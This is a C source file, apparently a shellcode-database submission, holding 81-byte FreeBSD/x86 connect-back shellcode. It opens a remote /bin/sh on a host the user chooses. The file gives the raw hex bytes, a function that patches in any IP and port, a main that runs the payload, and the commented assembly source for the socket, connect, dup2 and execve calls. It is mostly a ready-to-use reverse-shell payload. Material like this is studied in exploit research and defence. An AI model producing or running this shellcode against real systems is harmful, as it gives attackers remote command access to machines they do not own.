/*
 -------------- FreeBSD/x86 - connect back /bin/sh. 81 bytes ----------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */

#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode [] = "\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
                    "\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x68\x01\x02\x89"
                    "\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
                    "\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
                    "\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                    "\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";

void change_shellcode(const char *ip, unsigned short port)
{
   *((unsigned long*)(shellcode + 15)) = inet_addr(ip);
   *((unsigned short*)(shellcode + 21)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
      printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}
int main(void)
{
   const char ip[] = "127.0.0.1";
   unsigned short port = 1337;

   change_shellcode(ip, port);
   print_shellcode();
   printf("Shellcode len = %d bytes\n", sizeof(shellcode)-1);
   void (*f)() = (void*) shellcode;

   f();

   return 0;
}

/*
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Syscalls nums, on /usr/src/sys/kern/syscalls.master ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define IPPROTO_TCP 6
%define SOCK_STREAM 1
%define AF_INET 2

%define SYS_EXECV 59
%define SYS_DUP2 90
%define SYS_SOCKET 97
%define SYS_CONNECT 98

section .text

global _start

_start:
   xor eax, eax
   ;;;;;;;;;;;;;;;;;;;;;;
   ; socket()
   ;;;;;;;;;;;;;;;;;;;;;;
   push eax
   push byte SOCK_STREAM
   push byte AF_INET

   mov al, SYS_SOCKET
   push eax
   int 0x80
   mov edx, eax

   ;;;;;;;;;;;;;;;;;;;;;;
   ; sockaddr_in
   ;;;;;;;;;;;;;;;;;;;;;;
   push 0x0100007f
   push word 0x3905
   push word 0x0201
   mov ecx, esp

   ;;;;;;;;;;;;;;;;;;;;;
   ; connect()
   ;;;;;;;;;;;;;;;;;;;;;
   push byte 16
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_CONNECT
   push eax
   int 0x80

   ;;;;;;;;;;;;;;;;;;;;;
   ; dup2()
   ;;;;;;;;;;;;;;;;;;;;;
   xor ecx, ecx
.L:
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_DUP2
   push eax
   int 0x80

   inc cl
   cmp cl, 3
   jne .L

   ;;;;;;;;;;;;;;;;;;;;;;
   ; execv("/bin/sh")
   ;;;;;;;;;;;;;;;;;;;;;;
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
 */